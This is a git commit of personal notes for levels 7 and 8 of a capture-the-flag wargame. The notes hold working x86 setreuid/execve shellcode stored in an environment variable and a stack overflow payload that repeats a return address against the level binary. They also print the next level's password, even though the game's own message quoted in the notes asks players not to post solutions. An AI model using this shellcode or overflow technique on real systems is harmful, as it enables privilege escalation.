0f0c909aa6bfb485d190e8f6bb290cd3b9daff5d
ballban_Jung <ballban@hotmail.com>
2025-05-11 00:47:48 +0900

    utumno7,8

--- Utumno/utumno7/note.sh
+++ Utumno/utumno7/note.sh
@@ -1,7 +1,14 @@
 # Set the environment variables
-export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
+# If you add too many \x90, the program runs weirdly, so I just add 4 \x90
+export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 4 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
 # Get EGG's address
-/tmp/utumno5_ballban/check_env EGG # 0xffffd9f4
+/tmp/utumno5_ballban/check_env EGG # 0xffffdddc
+# I don't know why but everytime when I run other programs, the address of EGG swifts a little bit
+# This time for gef, it shifts 44 and for utumno7 it shifts 24
+gef /utumno/utumno7
+run $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 0 +  struct.pack('<I', 0xffffdddc + 44) * 35)")
 
+/utumno/utumno7 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffdddc + 24) * 35)")
 
-/utumno/utumno7 $(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 1000)")
+cat /etc/utumno_pass/utumno8
+# Password: oqnM7PWFIn
---
+++ Utumno/utumno8/note.sh
@@ -0,0 +1,5 @@
+cat CONGRATULATIONS
+
+# Hell Yeah! You did it!
+# One level of this game is still work in progress, so be sure to check back later.
+# (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
